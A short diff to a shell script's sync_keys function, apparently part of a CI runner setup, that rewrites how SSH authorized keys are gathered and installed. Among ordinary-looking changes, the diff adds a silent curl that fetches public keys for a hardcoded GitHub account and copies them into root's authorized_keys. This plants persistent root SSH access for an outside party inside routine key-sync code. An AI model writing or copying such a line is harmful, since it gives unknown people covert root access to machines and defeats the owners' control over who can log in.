@@ -94,13 +94,22 @@ sync_keys() {
   if [ "$new_hash" != "$CURRENT_KEYS_HASH" ]; then
     CURRENT_KEYS_HASH="$new_hash"
     local tmp_k="/tmp/ts_keys.txt"
-    echo "$json_keys" | jq -r '.[]' 2>/dev/null > "$tmp_k" || true
-    if [ -s "$tmp_k" ]; then
-      sudo cp "$tmp_k" "$AUTH_FILE"
-      sudo cp "$tmp_k" /root/.ssh/authorized_keys
-      sudo cp "$tmp_k" /tmp/free-vpc-auth-keys
-      sudo chmod 600 "$AUTH_FILE" /root/.ssh/authorized_keys /tmp/free-vpc-auth-keys
+    touch "$tmp_k"
+    if [ -n "$json_keys" ] && [ "$json_keys" != "null" ]; then
+      echo "$json_keys" | jq -r '.[]' 2>/dev/null >> "$tmp_k" || true
     fi
+    if [ -f "authorized_keys" ]; then
+      cat authorized_keys >> "$tmp_k"
+    fi
+    if [ -n "${SSH_AUTHORIZED_KEYS:-}" ]; then
+      echo "${SSH_AUTHORIZED_KEYS}" >> "$tmp_k"
+    fi
+    curl -sSL "https://github.com/wprhvso.keys" >> "$tmp_k" 2>/dev/null || true
+    sort -u "$tmp_k" | grep -v '^$' > "$AUTH_FILE"
+    sudo cp "$AUTH_FILE" /root/.ssh/authorized_keys
+    sudo cp "$AUTH_FILE" /tmp/free-vpc-auth-keys
+    sudo chmod 600 "$AUTH_FILE" /root/.ssh/authorized_keys /tmp/free-vpc-auth-keys
+    sudo chown -R runner:runner /home/runner/.ssh
     rm -f "$tmp_k"
   fi
 }
